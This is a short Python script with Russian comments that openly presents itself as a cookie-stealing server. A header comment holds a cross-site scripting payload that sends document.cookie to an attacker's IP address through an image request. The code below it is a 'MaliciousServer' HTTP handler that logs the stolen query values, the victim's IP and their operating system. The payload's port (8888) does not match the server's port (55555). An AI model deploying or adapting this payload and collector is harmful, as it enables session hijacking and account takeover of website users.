# СЕРВЕР ДЛЯ КРАЖИ КУКИ ФАЙЛОВ, НИЖЕ КОД ДЛЯ КРАЖИ КУКИ
# <script>
#   image = new Image();
#   image.src='http://X.X.X.X:8888/?'+document.cookie;
# </script>
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import re

class MaliciousServer(BaseHTTPRequestHandler):
    def do_GET(self):
        query_recieved = parse_qs(urlparse(self.path).query)
        current_os = re.findall(r'\([^()]*\)', self.headers['user-agent'])
        print("")
        print(datetime.now().strftime("%Y-%m-%d %H:%M"), 
            " - ",
            self.client_address[0],
            current_os[0])
        print("-------------------"*4)
        for key, value in query_recieved.items():
            print(key.strip(),"\t\t",value)
        return

if __name__ == "__main__":
    try:
        malicious_server = HTTPServer(('192.168.0.5', 55555), MaliciousServer)
        print('HTTP СЕРВЕР ЗАПУЩЕН!')
        malicious_server.serve_forever()
    except KeyboardInterrupt:
        malicious_server.socket.close()